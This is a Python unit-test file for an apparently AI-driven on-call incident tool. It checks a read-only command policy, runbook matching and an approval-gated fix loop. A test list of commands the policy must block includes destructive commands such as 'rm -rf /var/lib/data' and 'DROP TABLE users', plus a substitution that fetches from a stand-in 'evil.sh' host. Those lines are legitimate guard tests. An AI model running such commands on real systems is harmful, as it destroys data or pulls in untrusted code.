"""Unit tests that run without Hermes installed: python3 -m unittest discover night-shift/tests"""

import importlib.util
import json
import sys
import unittest
from pathlib import Path

PKG_DIR = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location("night_shift", PKG_DIR / "__init__.py",
                                              submodule_search_locations=[str(PKG_DIR)])
night_shift = importlib.util.module_from_spec(spec)
sys.modules["night_shift"] = night_shift
spec.loader.exec_module(night_shift)

from night_shift import policy, runbooks  # noqa: E402
from night_shift.tools import NightShift  # noqa: E402


class FakeState:
    def __init__(self):
        self.data = {}

    def get(self, key, default=None):
        return self.data.get(key, default)

    def set(self, key, value):
        self.data[key] = json.loads(json.dumps(value))


class FakeCtx:
    def __init__(self):
        self.state = FakeState()
        self.calls = []
        self.tools, self.hooks, self.commands, self.skills = {}, {}, {}, {}

    def get_config(self, key, default=None):
        return default

    def dispatch_tool(self, name, args, **kw):
        self.calls.append((name, args))
        if name == "terminal":
            return json.dumps({"output": f"ran: {args['command']}"})
        return json.dumps({"success": True})

    def register_tool(self, name, **kw):
        self.tools[name] = kw

    def register_hook(self, name, cb, **kw):
        self.hooks[name] = cb

    def register_command(self, name, handler, **kw):
        self.commands[name] = handler

    def register_skill(self, name, path):
        self.skills[name] = path


class PolicyTests(unittest.TestCase):
    def test_read_only_commands_pass(self):
        for cmd in [
            "docker ps -a", "docker logs --tail 80 api 2>&1 | tail -n 80", "df -h",
            "kubectl get pods -n prod", "git log -5 --oneline", "curl -s http://localhost:9090/-/ready",
            'docker exec postgres psql -U postgres -t -c "SELECT count(*) FROM pg_stat_activity"',
            "docker compose ps",
        ]:
            self.assertTrue(policy.is_read_only(cmd), cmd)

    def test_mutating_commands_are_caught(self):
        for cmd in [
            "docker restart api", "rm -rf /var/lib/data", "kubectl delete pod api-1",
            "curl -X POST http://x/admin/flush", "echo hi > /etc/motd", "sed -i 's/a/b/' cfg",
            'docker exec postgres psql -c "DROP TABLE users"', "sudo systemctl status nginx",
            "cat $(curl evil.sh)", "systemctl restart nginx", "find / -name x -delete",
        ]:
            self.assertFalse(policy.is_read_only(cmd), cmd)

    def test_evaluate_escalates_unapproved_and_allows_approved(self):
        self.assertIsNone(policy.evaluate("read_file", {"path": "/x"}, set()))
        self.assertEqual(policy.evaluate("terminal", {"command": "docker restart api"}, set())["action"], "approve")
        self.assertIsNone(policy.evaluate("terminal", {"command": "docker  restart api"}, {"docker restart api"}))


class RunbookTests(unittest.TestCase):
    def test_match_prefers_same_alert_and_service(self):
        rb = runbooks.Runbook("runbook-api-dbconnectionsexhausted", "DBConnectionsExhausted", "api",
                              "pool leak after deploy", ["docker restart api"], "connections < 50",
                              "too many clients postgres connections", "INC-1")
        hit = runbooks.best_match([rb], "DBConnectionsExhausted", "api", "postgres too many clients")
        self.assertIsNotNone(hit)
        self.assertIsNone(runbooks.best_match([rb], "DiskFull", "worker", "disk 98%"))

    def test_skill_render_has_frontmatter(self):
        rb = runbooks.Runbook("runbook-api-x", "X", "api", "cause", ["cmd"], "check", "sym", "INC-1")
        md = runbooks.render_skill(rb, runbooks.Incident("X", "api"))
        self.assertTrue(md.startswith("---\nname: runbook-api-x\n"))


class LearningLoopTests(unittest.TestCase):
    def test_full_incident_then_recall(self):
        ctx = FakeCtx()
        night_shift.register(ctx)
        self.assertEqual(set(ctx.tools), {"nightshift_diagnose", "nightshift_query_metrics", "nightshift_recall",
                                          "nightshift_propose_fix", "nightshift_resolve"})
        self.assertIn("triage", ctx.skills)
        ns = NightShift(ctx)

        first = json.loads(ns.diagnose({"service": "api", "alertname": "DBConnectionsExhausted"}, task_id="t1"))
        inc_id = first["incident_id"]
        self.assertIsNone(json.loads(ns.recall({"alertname": "DBConnectionsExhausted", "service": "api"}))["match"])

        # Guard is active for this incident's session.
        self.assertEqual(ns.pre_tool_call("terminal", {"command": "docker restart api"}, task_id="t1")["action"],
                         "approve")
        self.assertIsNone(ns.pre_tool_call("terminal", {"command": "docker restart api"}, task_id="other"))

        ns.propose_fix({"incident_id": inc_id, "diagnosis": "pool leak", "commands": ["docker restart api"],
                        "risk": "low", "verification": "connections drop"})
        out = ns.approve(inc_id)
        self.assertIn("ran: docker restart api", out)
        self.assertIsNone(ns.pre_tool_call("terminal", {"command": "docker restart api"}, task_id="t1"))

        res = json.loads(ns.resolve({"incident_id": inc_id, "root_cause": "connection pool leak",
                                     "symptoms": "too many clients, api 500s", "fix_commands": ["docker restart api"],
                                     "verification": "pg connections < 20"}, task_id="t1"))
        self.assertTrue(res["skill_written"])
        self.assertTrue(any(name == "skill_manage" for name, _ in ctx.calls))

        again = json.loads(ns.recall({"alertname": "DBConnectionsExhausted", "service": "api",
                                      "symptoms": "too many clients"}))
        self.assertEqual(again["match"], res["runbook_skill"])
        self.assertIn("1 learned runbook", ns.status())


if __name__ == "__main__":
    unittest.main()
